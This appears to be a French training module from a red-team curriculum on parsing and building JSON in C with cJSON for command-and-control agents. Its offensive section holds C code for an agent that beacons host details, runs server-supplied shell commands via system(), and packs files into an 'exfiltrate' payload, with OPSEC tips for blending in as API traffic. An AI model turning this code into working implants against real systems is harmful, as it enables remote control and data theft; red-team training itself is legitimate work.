# JSON Parsing en C - Bibliothèque cJSON

## Objectifs pédagogiques

À la fin de ce module, vous serez capable de :
- [ ] Comprendre le format JSON et son importance en C2
- [ ] Intégrer et utiliser la bibliothèque cJSON
- [ ] Parser des réponses JSON du serveur C2
- [ ] Créer des payloads JSON pour l'exfiltration de données

## Prérequis

Avant de commencer ce module, assurez-vous de maîtriser :
- Les bases du langage C (structures, pointeurs, malloc/free)
- Les concepts HTTP (vu dans module W47)
- Les bases de JSON (objets, tableaux, types de données)

## Introduction

JSON (JavaScript Object Notation) est le format standard pour échanger des données entre un agent C2 et son serveur. En C, il n'y a pas de support natif JSON, nous devons donc utiliser une bibliothèque comme **cJSON**.

### Pourquoi ce sujet est important ?

Imaginez un agent qui doit envoyer ceci au serveur C2 :
```
Hostname: DESKTOP-001
User: admin
Processes: [explorer.exe, chrome.exe, svchost.exe]
```

**Sans JSON** : Format custom difficile à parser, pas standard
**Avec JSON** : Format universel, facile à parser côté serveur (Python, Go, etc.)

```json
{
  "hostname": "DESKTOP-001",
  "user": "admin",
  "processes": ["explorer.exe", "chrome.exe", "svchost.exe"]
}
```

## Concepts fondamentaux

### Concept 1 : Structure JSON

JSON supporte 6 types de données :

```
JSON Object (dictionnaire)
{
  "key": "value"
}

JSON Array (liste)
[
  "item1",
  "item2"
]

JSON String
"Hello World"

JSON Number
42
3.14

JSON Boolean
true
false

JSON Null
null
```

**Architecture C2 typique** :
```
[Agent] ---> {"action":"checkin","data":{...}} ---> [Serveur C2]
[Agent] <--- {"command":"shell","args":"whoami"} <--- [Serveur C2]
[Agent] ---> {"result":"desktop\\admin"}        ---> [Serveur C2]
```

### Concept 2 : Bibliothèque cJSON

cJSON est une bibliothèque C légère pour manipuler JSON. Elle fonctionne ainsi :

```
cJSON_Parse(string)     -> Convertit JSON string en structure cJSON
cJSON_GetObjectItem()   -> Récupère une valeur par clé
cJSON_CreateObject()    -> Crée un objet JSON
cJSON_Print()           -> Convertit cJSON en string JSON
cJSON_Delete()          -> Libère la mémoire
```

**Hiérarchie cJSON** :
```
cJSON* root = cJSON_Parse("{...}")
    |
    +-- child (premier élément)
    |     |
    |     +-- string (clé)
    |     +-- valuestring (valeur si string)
    |     +-- valueint (valeur si int)
    |
    +-- next (élément suivant au même niveau)
```

### Concept 3 : Integration cJSON

cJSON est un fichier header unique, facile à intégrer :

```
Projet/
  |
  +-- cJSON.h       <- Header
  +-- cJSON.c       <- Implémentation
  +-- agent.c       <- Votre code
  |
  Compilation: gcc agent.c cJSON.c -o agent.exe
```

**Source** : https://github.com/DaveGamble/cJSON

## Mise en pratique

### Étape 1 : Installation de cJSON

```bash
# Télécharger cJSON
git clone https://github.com/DaveGamble/cJSON.git

# Copier les fichiers nécessaires
cp cJSON/cJSON.h ./
cp cJSON/cJSON.c ./
```

Ou intégrer directement dans votre projet (single-header library).

### Étape 2 : Parser une réponse JSON simple

```c
#include <stdio.h>
#include "cJSON.h"

int main() {
    // Réponse du serveur C2
    const char* response = "{\"command\":\"shell\",\"args\":\"whoami\"}";

    // 1. Parser le JSON
    cJSON* root = cJSON_Parse(response);
    if (!root) {
        printf("Error parsing JSON: %s\n", cJSON_GetErrorPtr());
        return 1;
    }

    // 2. Extraire les valeurs
    cJSON* command = cJSON_GetObjectItem(root, "command");
    cJSON* args = cJSON_GetObjectItem(root, "args");

    if (cJSON_IsString(command) && cJSON_IsString(args)) {
        printf("Command: %s\n", command->valuestring);
        printf("Args: %s\n", args->valuestring);
    }

    // 3. Libérer la mémoire
    cJSON_Delete(root);

    return 0;
}
```

**Compilation** :
```bash
gcc parse_json.c cJSON.c -o parse_json.exe
```

**Sortie** :
```
Command: shell
Args: whoami
```

### Étape 3 : Créer un payload JSON

```c
#include <stdio.h>
#include <windows.h>
#include "cJSON.h"

int main() {
    // 1. Créer un objet JSON racine
    cJSON* root = cJSON_CreateObject();

    // 2. Ajouter des champs simples
    cJSON_AddStringToObject(root, "action", "checkin");
    cJSON_AddNumberToObject(root, "pid", GetCurrentProcessId());
    cJSON_AddBoolToObject(root, "admin", FALSE);

    // 3. Ajouter des informations système
    char hostname[256];
    DWORD size = sizeof(hostname);
    GetComputerNameA(hostname, &size);
    cJSON_AddStringToObject(root, "hostname", hostname);

    // 4. Convertir en string JSON
    char* jsonString = cJSON_Print(root);
    printf("Beacon payload:\n%s\n", jsonString);

    // 5. Ici, envoyer jsonString au serveur C2 (WinInet)
    // SendBeacon(jsonString);

    // 6. Nettoyer
    cJSON_free(jsonString);
    cJSON_Delete(root);

    return 0;
}
```

**Sortie** :
```json
Beacon payload:
{
  "action": "checkin",
  "pid": 5432,
  "admin": false,
  "hostname": "DESKTOP-ABC123"
}
```

### Étape 4 : Gérer des tableaux JSON

```c
#include <stdio.h>
#include "cJSON.h"

// Parser un tableau de commandes
void ParseCommands(const char* json) {
    cJSON* root = cJSON_Parse(json);
    if (!root) return;

    cJSON* commands = cJSON_GetObjectItem(root, "commands");

    if (cJSON_IsArray(commands)) {
        int arraySize = cJSON_GetArraySize(commands);
        printf("Received %d commands:\n", arraySize);

        for (int i = 0; i < arraySize; i++) {
            cJSON* item = cJSON_GetArrayItem(commands, i);

            if (cJSON_IsString(item)) {
                printf("  [%d] %s\n", i, item->valuestring);
            }
        }
    }

    cJSON_Delete(root);
}

// Créer un tableau de processus
void CreateProcessList() {
    cJSON* root = cJSON_CreateObject();
    cJSON* processes = cJSON_CreateArray();

    // Ajouter des processus (ici hardcodés, en vrai: EnumProcesses)
    cJSON_AddItemToArray(processes, cJSON_CreateString("explorer.exe"));
    cJSON_AddItemToArray(processes, cJSON_CreateString("chrome.exe"));
    cJSON_AddItemToArray(processes, cJSON_CreateString("svchost.exe"));

    cJSON_AddItemToObject(root, "processes", processes);

    char* json = cJSON_Print(root);
    printf("Process list:\n%s\n", json);

    cJSON_free(json);
    cJSON_Delete(root);
}

int main() {
    // Test parsing
    const char* response = "{\"commands\":[\"whoami\",\"ipconfig\",\"net user\"]}";
    ParseCommands(response);

    printf("\n");

    // Test création
    CreateProcessList();

    return 0;
}
```

**Sortie** :
```
Received 3 commands:
  [0] whoami
  [1] ipconfig
  [2] net user

Process list:
{
  "processes": ["explorer.exe", "chrome.exe", "svchost.exe"]
}
```

### Étape 5 : Objets imbriqués (nested)

```c
#include <stdio.h>
#include "cJSON.h"

void CreateNestedBeacon() {
    // Racine
    cJSON* root = cJSON_CreateObject();

    // Objet "system"
    cJSON* system = cJSON_CreateObject();
    cJSON_AddStringToObject(system, "os", "Windows 10");
    cJSON_AddStringToObject(system, "arch", "x64");
    cJSON_AddNumberToObject(system, "cores", 4);
    cJSON_AddItemToObject(root, "system", system);

    // Objet "network"
    cJSON* network = cJSON_CreateObject();
    cJSON_AddStringToObject(network, "ip", "192.168.1.10");
    cJSON_AddStringToObject(network, "gateway", "192.168.1.1");
    cJSON_AddItemToObject(root, "network", network);

    // Convertir et afficher
    char* json = cJSON_Print(root);
    printf("%s\n", json);

    cJSON_free(json);
    cJSON_Delete(root);
}

void ParseNestedResponse(const char* json) {
    cJSON* root = cJSON_Parse(json);
    if (!root) return;

    // Accéder à des champs imbriqués
    cJSON* system = cJSON_GetObjectItem(root, "system");
    if (system) {
        cJSON* os = cJSON_GetObjectItem(system, "os");
        if (cJSON_IsString(os)) {
            printf("OS: %s\n", os->valuestring);
        }
    }

    cJSON_Delete(root);
}

int main() {
    CreateNestedBeacon();

    printf("\n");

    const char* response = "{\"system\":{\"os\":\"Windows 11\",\"arch\":\"x64\"}}";
    ParseNestedResponse(response);

    return 0;
}
```

## Application offensive

### Contexte Red Team

**Protocole C2 typique** :

```
┌─────────┐                              ┌──────────┐
│  Agent  │                              │ Serveur  │
│   C2    │                              │   C2     │
└────┬────┘                              └────┬─────┘
     │                                        │
     │  POST /beacon                          │
     │  {"action":"checkin","hostname":"PC1"} │
     ├───────────────────────────────────────>│
     │                                        │
     │  200 OK                                │
     │  {"command":"shell","args":"whoami"}   │
     │<───────────────────────────────────────┤
     │                                        │
     │  POST /result                          │
     │  {"output":"DOMAIN\\user"}             │
     ├───────────────────────────────────────>│
     │                                        │
```

### Exemple complet : Agent avec JSON

```c
#include <windows.h>
#include <stdio.h>
#include "cJSON.h"

// Créer un beacon JSON
char* CreateBeacon() {
    cJSON* root = cJSON_CreateObject();

    // Informations système
    char hostname[256], username[256];
    DWORD size = sizeof(hostname);
    GetComputerNameA(hostname, &size);
    size = sizeof(username);
    GetUserNameA(username, &size);

    cJSON_AddStringToObject(root, "action", "checkin");
    cJSON_AddStringToObject(root, "hostname", hostname);
    cJSON_AddStringToObject(root, "username", username);
    cJSON_AddNumberToObject(root, "pid", GetCurrentProcessId());

    // Convertir en string
    char* jsonString = cJSON_PrintUnformatted(root); // Sans indentation
    cJSON_Delete(root);

    return jsonString; // Appelant doit faire cJSON_free()
}

// Parser la réponse du serveur
void ExecuteCommand(const char* jsonResponse) {
    cJSON* root = cJSON_Parse(jsonResponse);
    if (!root) {
        printf("[-] Invalid JSON response\n");
        return;
    }

    cJSON* command = cJSON_GetObjectItem(root, "command");
    cJSON* args = cJSON_GetObjectItem(root, "args");

    if (cJSON_IsString(command)) {
        printf("[*] Command: %s\n", command->valuestring);

        if (strcmp(command->valuestring, "shell") == 0 && cJSON_IsString(args)) {
            // Exécuter la commande shell (voir module W58 pour capture output)
            printf("[*] Executing: %s\n", args->valuestring);
            system(args->valuestring);
        }
        else if (strcmp(command->valuestring, "sleep") == 0) {
            int duration = cJSON_GetObjectItem(root, "duration")->valueint;
            printf("[*] Sleeping for %d seconds\n", duration);
            Sleep(duration * 1000);
        }
        else if (strcmp(command->valuestring, "exit") == 0) {
            printf("[*] Exiting...\n");
            ExitProcess(0);
        }
    }

    cJSON_Delete(root);
}

int main() {
    // Simuler un beacon
    char* beaconData = CreateBeacon();
    printf("[+] Beacon data:\n%s\n\n", beaconData);
    // Ici: envoyer beaconData au serveur C2 (WinInet)
    cJSON_free(beaconData);

    // Simuler réponse serveur
    const char* serverResponse = "{\"command\":\"shell\",\"args\":\"whoami\"}";
    printf("[+] Server response:\n%s\n\n", serverResponse);

    ExecuteCommand(serverResponse);

    return 0;
}
```

### Considérations OPSEC

**Avantages JSON** :
1. **Standard** : Trafic JSON = trafic API légitime (analytics, etc.)
2. **Compact** : Moins de bande passante qu'XML
3. **Flexible** : Facilement extensible (ajout de champs)

**Points d'attention** :
```
[Attention !]
- Taille payload      -> JSON peut être verbeux, compresser si >10KB
- Caractères spéciaux -> Échapper " et \ correctement
- Mémoire             -> Toujours cJSON_Delete() pour éviter leaks
- Validation          -> Vérifier cJSON_Parse() != NULL
- Minimisation        -> Utiliser PrintUnformatted (pas d'espaces)
```

### Exemple : Exfiltration de fichiers en JSON

```c
#include <stdio.h>
#include <windows.h>
#include "cJSON.h"

// Encoder fichier en Base64 (simplifié)
char* Base64Encode(const char* data, size_t len) {
    // Implémentation base64 ici (ou utiliser une lib)
    // Pour l'exemple, on retourne juste "BASE64DATA"
    return _strdup("QmFzZTY0RGF0YQ==");
}

char* ExfiltrateFile(const char* filepath) {
    // Lire le fichier
    HANDLE hFile = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    char* fileData = (char*)malloc(fileSize + 1);
    DWORD bytesRead;
    ReadFile(hFile, fileData, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    // Encoder en base64
    char* encodedData = Base64Encode(fileData, bytesRead);
    free(fileData);

    // Créer JSON
    cJSON* root = cJSON_CreateObject();
    cJSON_AddStringToObject(root, "action", "exfiltrate");
    cJSON_AddStringToObject(root, "filename", filepath);
    cJSON_AddNumberToObject(root, "size", bytesRead);
    cJSON_AddStringToObject(root, "data", encodedData);

    char* json = cJSON_PrintUnformatted(root);

    free(encodedData);
    cJSON_Delete(root);

    return json; // Appelant doit faire cJSON_free()
}

int main() {
    char* exfilData = ExfiltrateFile("C:\\Windows\\System32\\drivers\\etc\\hosts");

    if (exfilData) {
        printf("Exfiltration payload:\n%s\n", exfilData);
        // Envoyer au C2 via WinInet
        cJSON_free(exfilData);
    }

    return 0;
}
```

## Résumé

- **cJSON** est une bibliothèque C légère pour manipuler JSON (single-header)
- **Parsing** : `cJSON_Parse()` → `cJSON_GetObjectItem()` → `cJSON_Delete()`
- **Création** : `cJSON_CreateObject()` → `cJSON_AddXToObject()` → `cJSON_Print()`
- **Mémoire** : Toujours libérer avec `cJSON_Delete()` et `cJSON_free()`
- **C2** : JSON est le format standard pour communication agent/serveur
- **OPSEC** : JSON ressemble à du trafic API légitime

## Ressources complémentaires

- [cJSON GitHub](https://github.com/DaveGamble/cJSON)
- [JSON Specification](https://www.json.org/)
- [Base64 Encoding in C](https://nachtimwald.com/2017/11/18/base64-encode-and-decode-in-c/)

---

**Navigation**
- [Module précédent](../03-WinInet-Client/)
- [Module suivant](../05-DNS-Communication/)
